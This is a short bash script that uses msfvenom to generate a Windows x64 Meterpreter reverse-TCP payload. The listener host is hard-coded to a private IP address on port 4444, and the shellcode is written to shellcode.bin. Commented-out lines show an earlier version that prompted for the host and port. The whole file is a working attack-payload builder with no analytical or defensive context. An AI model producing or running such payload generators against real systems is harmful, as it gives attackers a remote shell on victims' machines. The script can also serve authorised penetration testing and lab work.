#!/bin/bash

# echo "[ ? ] Enter LHOST : "
# read lhost
# echo "[ ? ] Enter LPORT : "
# read lport
# echo "Set LHOST : $lhost"
# echo "Set LPORT : $lport"
# echo "Create binary payload"

lhost="192.168.29.218"
lport="4444"
msfvenom -platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o shellcode.bin
